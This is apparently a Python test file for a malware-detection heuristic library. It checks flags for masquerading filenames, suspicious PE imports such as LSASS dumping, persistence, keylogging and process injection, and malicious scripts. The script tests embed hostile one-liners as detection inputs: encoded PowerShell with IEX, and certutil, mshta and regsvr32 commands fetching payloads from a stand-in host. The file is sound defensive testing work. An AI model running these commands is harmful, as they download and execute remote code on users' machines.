"""Tests for the heuristic signal library."""

from argus.heuristics.entropy import EntropySummary
from argus.heuristics.pe import parse_pe
from argus.heuristics.signals import (
    StringIndex,
    filename_signals,
    pe_signals,
    script_signals,
)
from tests.pe_fixtures import clean_pe, packed_injector_pe


def _index(*strings: str) -> StringIndex:
    idx = StringIndex()
    for s in strings:
        idx.add(s)
    return idx


def _names(signals) -> set[str]:
    return {s.name for s in signals}


def _parse(tmp_path, name: str, payload: bytes):
    path = tmp_path / name
    path.write_bytes(payload)
    return parse_pe(path)


# ----------------------------------------------------------------------
# Filename signals
# ----------------------------------------------------------------------
def test_filename_double_extension():
    hits = filename_signals("photo.jpg.exe")
    assert _names(hits) == {"double_extension"}
    assert hits[0].severity == "high"
    assert filename_signals("photo.jpg") == []
    assert filename_signals("setup.exe") == []
    assert filename_signals("archive.zip") == []


def test_filename_rtl_override_is_critical():
    hits = filename_signals("invoice\u202e" + "fdp.exe")
    assert _names(hits) == {"rtl_override_filename"}
    assert hits[0].severity == "critical"
    assert hits[0].points == 60


def test_filename_system_masquerade():
    hits = filename_signals("svchost.exe")
    assert _names(hits) == {"system_binary_masquerade"}
    assert filename_signals("my-svchost-helper.exe") == []


def test_filename_plain_names_clean():
    assert filename_signals("notes.txt") == []
    assert filename_signals("quarterly report.pdf") == []


# ----------------------------------------------------------------------
# PE signals
# ----------------------------------------------------------------------
def test_clean_pe_has_no_signals(tmp_path):
    pe = _parse(tmp_path, "clean.exe", clean_pe())
    for sec in pe.sections:
        sec.entropy = 6.0 if sec.name == ".text" else 4.0
    signals = pe_signals(pe, _index("Fixture Program", "Version 1.0"), EntropySummary())
    assert signals == []


def test_injector_pe_signals(tmp_path):
    pe = _parse(tmp_path, "inj.exe", packed_injector_pe())
    for sec in pe.sections:
        sec.entropy = 7.99 if sec.name == "UPX1" else None
    signals = pe_signals(pe, _index(), EntropySummary())
    names = _names(signals)
    assert "process_injection_combo" in names
    assert "high_entropy_executable_section" in names
    assert "packer_section_name" in names
    assert "writable_executable_section" in names
    assert "entry_point_unusual" in names
    combo = next(s for s in signals if s.name == "process_injection_combo")
    assert combo.severity == "critical"
    assert all(s.explanation for s in signals)  # every signal explains itself


def test_credential_signal_from_lsass_dump(tmp_path):
    pe = _parse(tmp_path, "clean.exe", clean_pe())
    pe.imports["KERNEL32.dll"].append("MiniDumpWriteDump")
    signals = pe_signals(pe, _index("lsass.exe"), EntropySummary())
    assert "credential_access" in _names(signals)


def test_persistence_signal_from_run_key(tmp_path):
    pe = _parse(tmp_path, "clean.exe", clean_pe())
    pe.imports["ADVAPI32.dll"] = ["RegSetValueExW"]
    idx = _index("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    signals = pe_signals(pe, idx, EntropySummary())
    assert "persistence_mechanism" in _names(signals)


def test_download_execute_signal(tmp_path):
    pe = _parse(tmp_path, "clean.exe", clean_pe())
    pe.imports["URLMON.dll"] = ["URLDownloadToFileW"]
    pe.imports["SHELL32.dll"] = ["ShellExecuteW"]
    signals = pe_signals(pe, _index(), EntropySummary())
    assert "download_and_execute" in _names(signals)


def test_keylogging_combo_and_single(tmp_path):
    pe = _parse(tmp_path, "clean.exe", clean_pe())
    pe.imports["USER32.dll"] += ["SetWindowsHookExW", "GetAsyncKeyState"]
    signals = pe_signals(pe, _index(), EntropySummary())
    assert "keylogging_combo" in _names(signals)

    pe2 = _parse(tmp_path, "clean2.exe", clean_pe())
    pe2.imports["USER32.dll"].append("GetAsyncKeyState")
    signals2 = pe_signals(pe2, _index(), EntropySummary())
    assert "keylogging_api" in _names(signals2)
    assert "keylogging_combo" not in _names(signals2)


def test_timestamp_anomaly_signal(tmp_path):
    pe = _parse(tmp_path, "clean.exe", clean_pe())
    pe.timestamp = 0
    signals = pe_signals(pe, _index(), EntropySummary())
    anomaly = next(s for s in signals if s.name == "timestamp_anomaly")
    assert anomaly.severity == "low"


def test_elevation_signal_only_when_unsigned(tmp_path):
    pe = _parse(tmp_path, "clean.exe", clean_pe())
    idx = _index('<requestedExecutionLevel level="requireAdministrator" />')
    signals = pe_signals(pe, idx, EntropySummary())
    assert "unsigned_elevation_request" in _names(signals)

    pe.signed = True
    signals = pe_signals(pe, idx, EntropySummary())
    assert "unsigned_elevation_request" not in _names(signals)


# ----------------------------------------------------------------------
# Script signals
# ----------------------------------------------------------------------
BENIGN_PS = (
    "Write-Host 'Backing up documents'\n"
    "Copy-Item .\\docs C:\\backup -Recurse\n"
    "Get-ChildItem C:\\backup | Measure-Object\n"
)


def test_benign_powershell_is_quiet():
    assert script_signals(BENIGN_PS, "backup.ps1") == []


def test_encoded_powershell_signal():
    blob = "SQBFAFgA" * 30  # long base64-ish payload
    text = f"powershell.exe -nop -enc {blob}"
    hits = script_signals(text, "run.ps1")
    assert _names(hits) == {"encoded_powershell_command"}
    assert hits[0].severity == "high"


def test_from_base64string_signal():
    text = "$x = [System.Convert]::FromBase64String($args[0]); IEX $x"
    assert "encoded_powershell_command" in _names(script_signals(text, "x.ps1"))


def test_lolbin_script_signals():
    cases = {
        "certutil -urlcache -f http://bad.example/x.exe x.exe": "certutil_download",
        "mshta http://bad.example/p.hta": "mshta_remote_script",
        "regsvr32 /s /n /u /i:http://bad.example/x.sct scrobj.dll": "regsvr32_remote",
        "rundll32 javascript:\\..\\mshtml,RunHTMLApplication": "rundll32_javascript",
    }
    for text, expected in cases.items():
        hits = script_signals(text, "a.bat")
        assert expected in _names(hits), text


def test_very_long_line_signal():
    text = "echo start\n" + "A" * 5000 + "\necho end\n"
    assert "very_long_script_line" in _names(script_signals(text, "a.cmd"))


def test_obfuscation_density_signal():
    text = "`p`o`w`e`r`s`h`e`l`l " * 60 + "[char]".join(["65"] * 20)
    assert "script_obfuscation" in _names(script_signals(text, "a.ps1"))
